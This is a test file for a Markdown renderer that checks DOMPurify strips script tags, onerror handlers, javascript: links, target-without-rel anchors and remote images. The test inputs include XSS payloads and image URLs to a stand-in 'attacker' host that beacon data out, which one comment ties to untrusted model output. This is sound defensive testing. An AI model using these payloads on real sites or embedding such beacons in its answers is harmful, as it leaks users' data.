// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import DOMPurify from 'dompurify';
import { renderMarkdown } from './markdown';

// Parses HTML through the DOM instead of matching substrings, since a
// substring check like `not.toContain('<script')` also passes for escaped
// text such as `&lt;script&gt;`, which proves nothing about the real risk.
function parse(html: string): HTMLElement {
  const el = document.createElement('div');
  el.innerHTML = html;
  return el;
}

describe('renderMarkdown', () => {
  it('renders bold text as <strong>', () => {
    const el = parse(renderMarkdown('**oi**'));
    expect(el.querySelector('strong')?.textContent).toBe('oi');
  });

  it('renders a fenced block as <pre><code> without interpreting its contents as Markdown', () => {
    const el = parse(renderMarkdown('```\n**not bold**\n```'));
    const code = el.querySelector('pre > code');
    expect(code?.textContent).toBe('**not bold**\n');
  });

  it('drops a <script> tag from the output', () => {
    const el = parse(renderMarkdown('<script>alert(1)</script>'));
    expect(el.querySelector('script')).toBeNull();
  });

  it('drops an onerror attribute from an <img>', () => {
    const el = parse(renderMarkdown('<img src=x onerror="alert(1)">'));
    expect(el.querySelector('img')?.hasAttribute('onerror')).toBe(false);
  });

  it('drops a javascript: href from a link', () => {
    const el = parse(renderMarkdown('[x](javascript:alert(1))'));
    const anchor = el.querySelector('a');
    // DOMPurify strips the unsafe attribute rather than the element, so the
    // link survives without its `href` at all.
    expect(anchor?.hasAttribute('href')).toBe(false);
  });

  it('returns a string without throwing for an unterminated fence (a streamed partial delta)', () => {
    expect(() => renderMarkdown('texto\n```bash\nnpm test')).not.toThrow();
    expect(typeof renderMarkdown('texto\n```bash\nnpm test')).toBe('string');
  });

  it('turns a single newline inside a paragraph into a <br> (breaks: true)', () => {
    const el = parse(renderMarkdown('linha um\nlinha dois'));
    expect(el.querySelector('br')).not.toBeNull();
  });

  it('keeps an image by default, which is what the notes preview renders', () => {
    const el = parse(renderMarkdown('![](https://exemplo/foto.png)'));
    expect(el.querySelector('img')?.getAttribute('src')).toBe('https://exemplo/foto.png');
  });

  it('drops an image when they are forbidden, so untrusted text cannot beacon out a GET', () => {
    // No CSP in this repo, so a remote `img` an answer chose the URL of would be fetched with no
    // click at all — the query string is whatever the model wrote.
    const el = parse(renderMarkdown('![](https://attacker/?d=segredo)', { allowImages: false }));
    expect(el.querySelector('img')).toBeNull();
  });

  it('drops a raw <img> tag too, not just Markdown image syntax', () => {
    const el = parse(renderMarkdown('<img src="https://attacker/?d=segredo">', { allowImages: false }));
    expect(el.querySelector('img')).toBeNull();
  });

  it('forbids only the image: the rest of the answer still renders', () => {
    const el = parse(renderMarkdown('**oi** ![](https://attacker/x.png) [link](https://exemplo)', { allowImages: false }));
    expect(el.querySelector('strong')?.textContent).toBe('oi');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('https://exemplo');
  });

  it('lets no anchor out with a target and no rel, on either path', () => {
    // A link that opens in a new tab keeps a handle on this one through `window.opener`. This
    // DOMPurify version happens to drop `target` outright, so the invariant is what is asserted
    // here, not which of the two ways it is reached.
    for (const options of [undefined, { allowImages: false }, { allowImages: true }]) {
      const anchor = parse(renderMarkdown('<a href="https://exemplo" target="_blank">x</a>', options)).querySelector('a');
      expect([anchor?.getAttribute('target') ?? null, anchor?.getAttribute('rel') ?? null]).not.toEqual(['_blank', null]);
    }
  });

  it('adds rel="noopener noreferrer" to an anchor that does keep a target', () => {
    // `renderMarkdown`'s own sanitise cannot show this today, since this DOMPurify version drops
    // `target` before any hook could see it — allowing that one attribute here exercises the hook
    // the module installs, which is what holds the moment that default changes back.
    const el = parse(DOMPurify.sanitize('<a href="https://exemplo" target="_blank">x</a>', { ADD_ATTR: ['target'] }));
    const anchor = el.querySelector('a');
    expect(anchor?.getAttribute('target')).toBe('_blank');
    expect(anchor?.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('returns the empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('');
  });
});
